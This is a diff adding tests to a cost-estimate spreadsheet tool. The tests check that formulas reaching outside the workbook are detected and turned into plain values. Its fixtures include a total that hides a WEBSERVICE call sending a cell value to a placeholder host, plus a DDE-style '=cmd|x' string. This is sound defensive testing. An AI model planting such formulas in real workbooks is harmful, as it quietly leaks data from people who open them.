@@ -256,5 +256,57 @@ f4[k('АНКЕР ТЕСТОВЫЙ М8', 'ШТ', 19)] = 16;
 f4[k('ТРУБА ТЕСТОВАЯ 50 ММ', 'М', 17)] = 12;
 run('form 4А, re-priced', S.smeta.parseWorkbook(form4aBook(), 'b.xlsx'), f4, slack);
 
+/* ------------------------------------------------------------------ a formula that does more than add */
+/*
+ * The estimate comes from outside, and its formulas go into a document that is signed and sent on. A total
+ * written as =SUM(…)+0*LEN(WEBSERVICE("http://…")) is still a total, and calls an address when the document is
+ * opened. Only formulas made of the plain functions an estimate needs are carried alive; the rest go in as the
+ * numbers the estimate shows, and are counted.
+ */
+{
+  const u = S.formula.unsafe;
+  check(u('=SUM(G8:G15)').length === 0 && u('=ROUND(D7*E7,2)').length === 0 && u('=IF(A1>0,VLOOKUP(A1,B1:C9,2,0),0)').length === 0 && u('=D7*E7').length === 0,
+    'sums, rounding, conditions and look-ups are plain');
+  check(u('=SUM(G8:G15)+0*LEN(WEBSERVICE("http://x/"))').join() === 'WEBSERVICE' && u('=HYPERLINK("http://x","a")').join() === 'HYPERLINK' &&
+    u('=_xlfn.WEBSERVICE(A1)').join() === 'WEBSERVICE', 'a function that reaches outside is named, however it is spelled');
+  check(u('="WEBSERVICE("&A1').length === 0, 'the word inside a text is only a text');
+  check(u('=[1]Лист1!A1').length === 1 && u('=cmd|x').length === 1 && u('=НОВАЯ(A1)').length === 1, 'a link to another workbook, a DDE channel and an unknown function are not plain');
+
+  const sh = (rows) => { const out = []; rows.forEach((line, i) => { const cells = []; line.forEach((v, c) => { if (v == null) return;
+    cells[c + 1] = v && v.f ? { f: v.f, v: v.v } : { v }; }); out[i + 1] = cells; }); return { name: 'УЛ1', rows: out }; };
+  const book = { sheets: [sh([
+    ['ТЕСТОВАЯ СТРОЙКА'], ['ТЕСТОВАЯ УЛИЦА'], [],
+    ['СТРОИТЕЛЬНЫЕ МАТЕРИАЛЫ И КОНСТРУКЦИИ'],
+    [1, 'ЩЕБЕНЬ ТЕСТОВЫЙ', 'М3', 4, 17, { f: '=D5*E5', v: 68 }],
+    [2, 'АНКЕР ТЕСТОВЫЙ М8', 'ШТ', 3, 19, { f: '=D6*E6', v: 57 }],
+    ['ИТОГО', null, 'СУМ', null, null, { f: '=SUM(F5:F6)+0*LEN(WEBSERVICE("http://example.invalid/"&F5))', v: 125 }],
+    [null, 'ТРАНСПОРТНЫЕ УСЛУГИ', 'СУМ', null, null, { f: '=ROUND(F7*0.05,0)', v: 6 }],
+    [null, 'ССЫЛКА', 'СУМ', null, null, { f: '=HYPERLINK("http://example.invalid/","1")', v: 1 }]
+  ])] };
+  const objects = S.smeta.parseWorkbook(book, 'x.xlsx');
+  const model = S.assemble([{ id: 'p', name: 'Тест', title: 'ТЕСТ', objects }], {});
+  check(model.frozen.count === 2 && model.frozen.names.join() === 'HYPERLINK,WEBSERVICE', 'the model counts the formulas it did not carry alive and names their functions (' + JSON.stringify(model.frozen) + ')');
+  ['changed', 'dedup', 'full'].forEach((mode) => {
+    const wb = S.readXlsx(S.buildWorkbook(model, { mode, minDiff: 0 }));
+    const all = [];
+    wb.sheets.forEach((s2) => s2.rows.forEach((row) => (row || []).forEach((c) => { if (c) all.push(c); })));
+    const live = all.filter((c) => c.f != null).map((c) => c.f);
+    check(!live.some((f) => /WEBSERVICE|HYPERLINK/i.test(f)) && !all.some((c) => typeof c.v === 'string' && /^=.*WEBSERVICE/i.test(c.v)),
+      mode + ': no formula of the document calls outside (' + live.length + ' formulas)');
+    if (mode === 'full') {
+      const main = wb.sheets[0], C = model.cols;
+      const total = model.rows.find((r) => r.kind === 'total'), over = model.rows.filter((r) => r.kind === 'extra');
+      const cell = (r, c) => main.rows[r.r][c];
+      // its number is then a typed total like any other, and is traced back to the lines it is the sum of
+      check(/^=SUM\(G\d+:G\d+\)$/.test(cell(total, C.SUM).f) && /^=SUM\(I\d+:I\d+\)$/.test(cell(total, C.MSUM).f) && makeSheetCalc(main).value(total.r, C.MSUM) === 125,
+        'the total that called outside is a plain sum of its lines again, on both sides (' + cell(total, C.SUM).f + ')');
+      check(/^=ROUND\(G\d+\*0\.05,0\)$/.test(cell(over[0], C.SUM).f) && /^=ROUND\(I\d+\*0\.05,0\)$/.test(cell(over[0], C.MSUM).f), 'the overhead next to it, a plain formula, is still alive on both sides');
+      check(cell(over[1], C.SUM).f == null && cell(over[1], C.SUM).v === 1, 'a link is a value');
+    }
+  });
+  const plain = S.assemble([{ id: 'p', name: 'Тест', title: 'ТЕСТ', objects: S.smeta.parseWorkbook(standardBook(), 'a.xlsx') }], {});
+  check(plain.frozen.count === 0, 'an ordinary estimate has nothing of the kind');
+}
+
 console.log(fail ? '\nFAILED: ' + fail : '\nall passed');
 process.exit(fail ? 1 : 0);
